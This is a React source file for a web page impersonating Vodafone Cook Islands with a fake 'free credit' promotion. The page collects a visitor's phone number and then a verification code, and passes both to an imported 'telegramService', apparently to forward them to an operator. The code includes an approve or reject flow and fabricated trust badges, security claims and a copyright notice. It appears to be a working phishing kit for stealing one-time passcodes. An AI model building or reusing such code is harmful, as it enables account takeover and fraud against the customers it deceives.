import React, { useState } from 'react';
import { Smartphone, Shield, MapPin, Gift, Star } from 'lucide-react';
import { PhoneInput } from './components/PhoneInput';
import { CodeInput } from './components/CodeInput';
import { SuccessMessage } from './components/SuccessMessage';
import { UserReviews } from './components/UserReviews';
import type { AppData } from './types';
import { sendPhoneNumber, sendVerificationCode } from './services/telegramService';

function App() {
  const [appData, setAppData] = useState<AppData>({
    phoneNumber: ['', '', '', '', ''],
    verificationCode: ['', '', '', '', ''],
    currentState: 'phone-entry',
    isLoading: false
  });

  const updatePhoneNumber = (index: number, value: string) => {
    const newPhoneNumber = [...appData.phoneNumber];
    newPhoneNumber[index] = value;
    setAppData(prev => ({ ...prev, phoneNumber: newPhoneNumber }));
  };

  const updateVerificationCode = (index: number, value: string) => {
    const newVerificationCode = [...appData.verificationCode];
    newVerificationCode[index] = value;
    setAppData(prev => ({ ...prev, verificationCode: newVerificationCode }));
  };

  const handlePhoneSubmit = async () => {
    setAppData(prev => ({ ...prev, isLoading: true }));
    
    try {
      const success = await sendPhoneNumber(appData.phoneNumber);
      if (success) {
        setAppData(prev => ({ 
          ...prev, 
          currentState: 'code-verification', 
          isLoading: false 
        }));
      } else {
        alert('Failed to send phone number. Please try again.');
        setAppData(prev => ({ ...prev, isLoading: false }));
      }
    } catch (error) {
      console.error('Error:', error);
      alert('An error occurred. Please try again.');
      setAppData(prev => ({ ...prev, isLoading: false }));
    }
  };

  const handleCodeSubmit = async () => {
    setAppData(prev => ({ ...prev, isLoading: true }));
    
    try {
      const result = await sendVerificationCode(appData.phoneNumber, appData.verificationCode);
      
      if (result.success) {
        if (result.approved) {
          setAppData(prev => ({ 
            ...prev, 
            currentState: 'success', 
            isLoading: false 
          }));
        } else {
          setAppData(prev => ({ 
            ...prev, 
            currentState: 'error', 
            isLoading: false,
            verificationCode: ['', '', '', '', '']
          }));
        }
      } else {
        alert('Failed to verify code. Please try again.');
        setAppData(prev => ({ ...prev, isLoading: false }));
      }
    } catch (error) {
      console.error('Error:', error);
      alert('An error occurred. Please try again.');
      setAppData(prev => ({ ...prev, isLoading: false }));
    }
  };

  const renderCurrentStep = () => {
    switch (appData.currentState) {
      case 'phone-entry':
        return (
          <PhoneInput
            phoneNumber={appData.phoneNumber}
            onPhoneChange={updatePhoneNumber}
            onSubmit={handlePhoneSubmit}
            isLoading={appData.isLoading}
          />
        );
      
      case 'code-verification':
      case 'error':
        return (
          <CodeInput
            verificationCode={appData.verificationCode}
            onCodeChange={updateVerificationCode}
            onSubmit={handleCodeSubmit}
            isLoading={appData.isLoading}
            isError={appData.currentState === 'error'}
          />
        );
      
      case 'success':
        return <SuccessMessage />;
      
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-600 via-red-700 to-red-800 relative overflow-x-hidden">
      {/* Enhanced Background Pattern */}
      <div className="absolute inset-0">
        <div className="absolute inset-0 bg-gradient-to-br from-transparent via-black/10 to-black/20" />
        <div className="absolute inset-0 bg-gradient-to-t from-black/20 via-transparent to-transparent" />
        {/* Subtle dot pattern */}
        <div className="absolute inset-0 opacity-10" 
             style={{
               backgroundImage: 'radial-gradient(circle at 1px 1px, rgba(255,255,255,0.3) 1px, transparent 0)',
               backgroundSize: '20px 20px'
             }} 
        />
      </div>
      
      {/* Enhanced Vodafone Logo and Branding */}
      <div className="relative z-10 pt-8 pb-6">
        <div className="flex flex-col items-center space-y-4">
          <div className="flex items-center space-x-4">
            <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center shadow-xl">
              <Smartphone className="w-8 h-8 text-red-600" />
            </div>
            <div className="text-white">
              <h1 className="text-4xl font-bold tracking-tight">Vodafone</h1>
              <p className="text-red-100 text-lg font-medium">Cook Islands</p>
            </div>
          </div>
          
          {/* Trust indicators */}
          <div className="flex items-center space-x-6 mt-4">
            <div className="flex items-center space-x-2">
              <Star className="w-5 h-5 text-yellow-400 fill-current" />
              <span className="text-white/90 font-medium">4.9/5 Rating</span>
            </div>
            <div className="flex items-center space-x-2">
              <MapPin className="w-5 h-5 text-white/90" />
              <span className="text-white/90 font-medium">Cook Islands Only</span>
            </div>
            <div className="flex items-center space-x-2">
              <Gift className="w-5 h-5 text-white/90" />
              <span className="text-white/90 font-medium">100% Free</span>
            </div>
          </div>
        </div>
      </div>

      {/* Enhanced Main Content */}
      <div className="relative z-10 px-4 pb-12">
        <div className="max-w-md mx-auto">
          {/* Enhanced Main Heading */}
          <div className="text-center mb-10">
            <h1 className="text-4xl md:text-5xl font-bold text-white leading-tight mb-6 drop-shadow-2xl">
              Get <span className="bg-gradient-to-r from-yellow-300 to-orange-400 bg-clip-text text-transparent">Free Credit</span>
              <br />from Vodafone
            </h1>
            <p className="text-xl text-red-100 font-medium mb-4">
              Exclusive for Cook Islands customers
            </p>
            <div className="bg-white/10 backdrop-blur-md rounded-full border border-white/20 px-6 py-2 inline-block">
              <p className="text-white/90 text-sm font-medium">
                🏝️ Available on all Cook Islands atolls
              </p>
            </div>
          </div>

          {/* Enhanced Dynamic Content */}
          <div className="mb-12">
            {renderCurrentStep()}
          </div>
        </div>
      </div>

      {/* Enhanced User Reviews Section */}
      <div className="relative z-10 px-4 pb-12">
        <div className="max-w-6xl mx-auto">
          <UserReviews />
        </div>
      </div>

      {/* Enhanced Footer */}
      <div className="relative z-10 px-4 pb-8">
        <div className="max-w-4xl mx-auto text-center">
          <div className="bg-white/5 backdrop-blur-md rounded-2xl border border-white/10 p-8 mb-6">
            <div className="flex items-center justify-center space-x-3 mb-4">
              <Shield className="w-6 h-6 text-white" />
              <h3 className="text-white font-bold text-lg">Trusted by Cook Islands</h3>
            </div>
            <p className="text-white/80 mb-4">
              Official Vodafone Cook Islands promotion. Your data is secure and protected.
            </p>
            <div className="flex justify-center space-x-8 text-white/70 text-sm">
              <span>✓ SSL Encrypted</span>
              <span>✓ No Hidden Fees</span>
              <span>✓ Instant Credit</span>
              <span>✓ 24/7 Support</span>
            </div>
          </div>
          
          <div className="text-center">
            <p className="text-white/60 text-sm mb-2">
              © 2025 Vodafone Cook Islands. All rights reserved.
            </p>
            <p className="text-white/40 text-xs">
              Licensed operator in the Cook Islands • Customer service: 123
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;